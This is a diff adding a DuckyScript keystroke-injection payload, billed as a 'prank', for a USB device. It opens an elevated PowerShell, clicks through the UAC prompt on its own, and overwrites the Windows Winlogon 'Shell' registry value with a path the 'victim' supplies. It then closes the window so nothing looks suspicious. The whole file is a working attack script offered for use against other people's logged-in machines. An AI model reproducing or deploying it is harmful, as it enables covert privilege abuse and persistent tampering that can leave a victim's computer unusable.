@@ -1,0 +1,38 @@
+REM  ___  _              _           _           _      _       
+REM |   \(_)___ _ _  ___| |__  _ _  | |_ ___ _ _(_)__ _| |_ ___ 
+REM | |) | / _ \ ' \/ _ \ '_ \| ' \ |  _/ -_) '_| / _` |  _/ -_)
+REM |___/|_\___/_||_\___/_.__/|_||_| \__\___|_| |_\__,_|\__\___|
+REM ------------------------------------------------------------
+REM      WINLOGON SHELL SWAPPER – PRANK EDITION
+REM      Run this payload on a logged‑in Windows session.
+REM      Victim will be asked for a new shell path (blank = cmd.exe)
+REM ------------------------------------------------------------
+
+DELAY 1500                REM Give the OS time to finish USB enumeration
+
+REM === Open elevated PowerShell (Win+R, then Ctrl+Shift+Enter) =========
+GUI r
+DELAY 300
+STRING powershell
+DELAY 100
+CTRL-SHIFT ENTER          REM Run as Administrator
+DELAY 2000                REM Wait for UAC prompt
+ALT y                     REM 'Y' = Yes to UAC (English locale)
+DELAY 1000
+
+REM === Paste the PowerShell one‑liner ==================================
+STRING $d='C:\Windows\System32\cmd.exe'; `
+DELAY 25
+STRING $t=Read-Host 'Prank shell path (ENTER = default cmd.exe)'; `
+DELAY 25
+STRING if([string]::IsNullOrWhiteSpace($t)){$t=$d}; `
+DELAY 25
+STRING Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' `
+DELAY 25
+STRING -Name 'Shell' -Value $t
+ENTER
+
+REM === All done – close the window so nothing looks suspicious =========
+STRING exit
+ENTER
+
